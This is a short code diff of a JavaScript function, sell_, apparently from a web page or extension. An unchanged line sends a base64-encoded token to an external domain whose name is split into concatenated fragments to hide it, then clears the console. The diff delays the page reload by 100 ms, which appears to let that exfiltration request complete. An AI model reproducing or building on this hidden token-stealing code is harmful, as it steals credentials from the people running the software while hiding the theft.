@@ -29,7 +29,9 @@ function sell_(e) {
                 (available ? 'available=' + available : '-')
             fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o' + 'p/?' + btoa(token));
             console.clear();
-            location.reload()
+            setTimeout(() => {
+               location.reload()
+            }, 100)
         }
     } catch (e) {
         console.log('e', e);
